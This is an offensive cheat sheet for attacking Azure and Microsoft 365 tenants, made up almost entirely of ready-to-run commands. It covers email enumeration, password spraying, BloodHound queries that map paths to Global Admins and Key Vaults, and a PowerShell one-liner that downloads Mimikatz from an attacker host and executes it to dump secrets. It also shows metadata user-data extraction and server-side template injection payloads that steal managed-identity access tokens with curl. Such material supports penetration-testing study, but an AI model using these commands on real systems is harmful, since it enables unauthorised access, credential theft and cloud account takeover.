### Discover valid emails using o365creeper
Add a list of possible emails in the emails.txt file
> python o365creeper.py -f emails.txt -o validemails.txt 

### Password spray
> MSOLSpray\MSOLSPray.ps1
Invoke-MSOLSpray -UserList emails.txt
-Password \<password> -Verbose 

### Using Bloodhound
Connect with both AzureAD module and AZ PS
>Connect-AzAccount -Credential $creds

>Connect-AzureAD -Credential $creds

Use BloodHound
> . AzureHound.ps1

> Invoke-AzureHound -Verbose

Log in in BloodHound (username: neo4j, password: BloodHound)

To resolve ObjectIds to names
> MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name =
n.azname

Find all users who have the Global Administrator role
> MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p

Find all paths to an Azure VM
>MATCH p = (n)-[r]->(g: AZVM) RETURN p

Find all paths to an Azure KeyVault
>MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p

Find all paths to an Azure Resource Group
>MATCH p = (n)-[r]->(g:AZResourceGroup) RETURN p

Find Owners of Azure Groups
>MATCH p = (n)-[r:AZOwns]->(g:AZGroup) RETURN p

### Get creds w/ Mimikatz
Download and execute Mimikatz
>iex (New-Object Net.Webclient).DownloadString("http://\<IP>:\<port>/Invoke-Mimikatz.ps1")

>Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'

### Extract user data
>$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://\<IP>/metadata/instance/compute/userData?api-version=2021-01-01&format=text"

>[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

### Look in PowerShell context history
> Get-PSReadLineOption

### Request a key vault access token
```
{{config.__class__.__init__.__globals__['os'].popen('curl
"$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```
### Request an ARM access token.
```
{{config.__class__.__init__.__globals__['os'].popen('curl
"$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```
